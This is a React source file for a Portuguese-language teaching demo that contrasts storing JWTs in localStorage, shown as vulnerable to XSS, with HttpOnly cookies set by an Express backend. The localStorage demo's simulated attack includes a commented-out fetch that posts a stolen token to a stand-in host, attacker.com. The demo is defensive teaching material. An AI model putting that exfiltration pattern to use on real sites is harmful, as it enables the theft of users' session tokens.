'use client'

import { CodePlayground } from '../code-playground'

export function TokenStorageDemoSandpack() {
  const localStorageCode = {
    '/App.js': `import { useState, useEffect } from 'react'

export default function App() {
  const [token, setToken] = useState('')
  const [storedToken, setStoredToken] = useState('')

  useEffect(() => {
    // Simula token existente
    const existing = localStorage.getItem('access_token')
    if (existing) setStoredToken(existing)
  }, [])

  const saveToken = () => {
    // ❌ VULNERÁVEL - Token acessível via JavaScript
    localStorage.setItem('access_token', token)
    setStoredToken(token)
    alert('Token salvo no localStorage!')
  }

  const stealToken = () => {
    // Simula um ataque XSS roubando o token
    const stolen = localStorage.getItem('access_token')
    alert(\`Token roubado: \${stolen}\`)
    
    // Em um ataque real, seria enviado para servidor do atacante:
    // fetch('https://attacker.com/steal', {
    //   method: 'POST',
    //   body: JSON.stringify({ token: stolen })
    // })
  }

  const clearStorage = () => {
    localStorage.removeItem('access_token')
    setStoredToken('')
    setToken('')
  }

  return (
    <div style={{ padding: '20px', fontFamily: 'sans-serif' }}>
      <h2>localStorage - INSECURE</h2>
      
      <div style={{ 
        background: '#ffebee', 
        padding: '15px', 
        borderRadius: '8px',
        marginBottom: '20px'
      }}>
        <strong style={{ color: '#c62828' }}>⚠️ Problema:</strong>
        <p>Qualquer script pode acessar localStorage, incluindo scripts maliciosos (XSS)</p>
      </div>

      <div style={{ marginBottom: '20px' }}>
        <input
          type="text"
          value={token}
          onChange={(e) => setToken(e.target.value)}
          placeholder="Simule um token JWT"
          style={{ 
            padding: '10px', 
            width: '100%', 
            marginBottom: '10px',
            border: '2px solid #ff6b6b'
          }}
        />
        <button 
          onClick={saveToken}
          style={{ 
            padding: '10px 20px', 
            background: '#ff6b6b', 
            color: 'white', 
            border: 'none',
            cursor: 'pointer',
            marginRight: '10px'
          }}
        >
          Salvar no localStorage
        </button>
        <button 
          onClick={clearStorage}
          style={{ 
            padding: '10px 20px', 
            background: '#666', 
            color: 'white', 
            border: 'none',
            cursor: 'pointer'
          }}
        >
          Limpar
        </button>
      </div>

      {storedToken && (
        <div style={{ 
          background: '#fff3e0', 
          padding: '15px', 
          borderRadius: '8px',
          marginBottom: '20px'
        }}>
          <strong>Token armazenado:</strong>
          <pre style={{ 
            background: '#fff', 
            padding: '10px', 
            borderRadius: '4px',
            overflow: 'auto'
          }}>
            {storedToken}
          </pre>
        </div>
      )}

      <div style={{ 
        background: '#ffcdd2', 
        padding: '15px', 
        borderRadius: '8px'
      }}>
        <strong style={{ color: '#c62828' }}>🎯 Simule um Ataque XSS:</strong>
        <p>Veja como é fácil roubar o token:</p>
        <button 
          onClick={stealToken}
          style={{ 
            padding: '10px 20px', 
            background: '#d32f2f', 
            color: 'white', 
            border: 'none',
            cursor: 'pointer',
            marginTop: '10px'
          }}
        >
          🔓 Roubar Token
        </button>
      </div>

      <div style={{ 
        marginTop: '20px',
        padding: '15px',
        background: '#e8f5e9',
        borderRadius: '8px',
        borderLeft: '4px solid #4caf50'
      }}>
        <strong style={{ color: '#2e7d32' }}>✅ Solução:</strong>
        <p>Use HttpOnly Cookies configurados pelo backend. JavaScript não consegue acessá-los!</p>
      </div>
    </div>
  )
}`,
  }

  const cookiesCode = {
    '/App.js': `import { useState } from 'react'

export default function App() {
  const [username, setUsername] = useState('')
  const [password, setPassword] = useState('')
  const [isLoggedIn, setIsLoggedIn] = useState(false)

  const login = async () => {
    // Simula login com backend
    // Backend retorna HttpOnly Cookie automaticamente
    
    // Em produção, seria algo como:
    // const res = await fetch('/api/login', {
    //   method: 'POST',
    //   credentials: 'include', // Importante!
    //   body: JSON.stringify({ username, password })
    // })
    
    setIsLoggedIn(true)
    alert('Login realizado! Cookie HttpOnly foi definido pelo servidor.')
  }

  const tryStealCookie = () => {
    // Tenta acessar o cookie
    const cookies = document.cookie
    
    if (!cookies || cookies.indexOf('auth_token') === -1) {
      alert(\`✅ PROTEGIDO!\\n\\nCookies acessíveis: \${cookies || '(nenhum)'}\\n\\nO cookie auth_token é HttpOnly e não pode ser lido via JavaScript!\`)
    } else {
      alert('Cookie encontrado (isso não deveria acontecer!)')
    }
  }

  const makeAuthenticatedRequest = () => {
    // O cookie é enviado automaticamente pelo navegador
    alert(\`📡 Request para /api/user-data\\n\\nO cookie HttpOnly é enviado automaticamente!\\nBackend valida e retorna os dados.\`)
    
    // Em produção:
    // fetch('/api/user-data', {
    //   credentials: 'include'
    // })
  }

  return (
    <div style={{ padding: '20px', fontFamily: 'sans-serif' }}>
      <h2>✅ HttpOnly Cookies - SEGURO</h2>
      
      <div style={{ 
        background: '#e8f5e9', 
        padding: '15px', 
        borderRadius: '8px',
        marginBottom: '20px'
      }}>
        <strong style={{ color: '#2e7d32' }}>🔒 Seguro:</strong>
        <p>HttpOnly cookies são inacessíveis ao JavaScript, protegendo contra XSS</p>
      </div>

      {!isLoggedIn ? (
        <div style={{ marginBottom: '20px' }}>
          <input
            type="text"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            placeholder="Username"
            style={{ 
              padding: '10px', 
              width: '100%', 
              marginBottom: '10px',
              border: '2px solid #4caf50'
            }}
          />
          <input
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            placeholder="Password"
            style={{ 
              padding: '10px', 
              width: '100%', 
              marginBottom: '10px',
              border: '2px solid #4caf50'
            }}
          />
          <button 
            onClick={login}
            style={{ 
              padding: '10px 20px', 
              background: '#4caf50', 
              color: 'white', 
              border: 'none',
              cursor: 'pointer'
            }}
          >
            Login (Backend define HttpOnly Cookie)
          </button>
        </div>
      ) : (
        <div style={{ marginBottom: '20px' }}>
          <div style={{ 
            background: '#c8e6c9', 
            padding: '15px', 
            borderRadius: '8px',
            marginBottom: '15px'
          }}>
            <strong style={{ color: '#2e7d32' }}>✅ Autenticado!</strong>
            <p>Cookie HttpOnly foi definido pelo backend</p>
          </div>

          <button 
            onClick={tryStealCookie}
            style={{ 
              padding: '10px 20px', 
              background: '#ff9800', 
              color: 'white', 
              border: 'none',
              cursor: 'pointer',
              marginRight: '10px',
              marginBottom: '10px'
            }}
          >
            🔓 Tentar Roubar Cookie
          </button>

          <button 
            onClick={makeAuthenticatedRequest}
            style={{ 
              padding: '10px 20px', 
              background: '#2196f3', 
              color: 'white', 
              border: 'none',
              cursor: 'pointer',
              marginBottom: '10px'
            }}
          >
            📡 Fazer Request Autenticada
          </button>
        </div>
      )}

      <div style={{ 
        background: '#e3f2fd', 
        padding: '15px', 
        borderRadius: '8px'
      }}>
        <strong>Backend Code (Node.js/Express):</strong>
        <pre style={{ 
          background: '#263238', 
          color: '#aed581',
          padding: '15px', 
          borderRadius: '4px',
          overflow: 'auto',
          marginTop: '10px'
        }}>
{\`app.post('/api/login', (req, res) => {
  // Valida credenciais
  const token = generateJWT(user)
  
  // Define cookie HttpOnly
  res.cookie('auth_token', token, {
    httpOnly: true,    // ← Inacessível ao JS
    secure: true,      // ← Apenas HTTPS
    sameSite: 'strict' // ← Anti-CSRF
  })
  
  res.json({ success: true })
})\`}
        </pre>
      </div>
    </div>
  )
}`,
  }

  return (
    <div className="space-y-6">
      <div>
        <h4 className="text-lg font-semibold mb-3 text-red-400">❌ localStorage (Vulnerável a XSS)</h4>
        <CodePlayground files={localStorageCode} editorHeight="700px" />
      </div>
      
      <div>
        <h4 className="text-lg font-semibold mb-3 text-emerald-400">✅ HttpOnly Cookies (Seguro)</h4>
        <CodePlayground files={cookiesCode} editorHeight="700px" />
      </div>
    </div>
  )
}
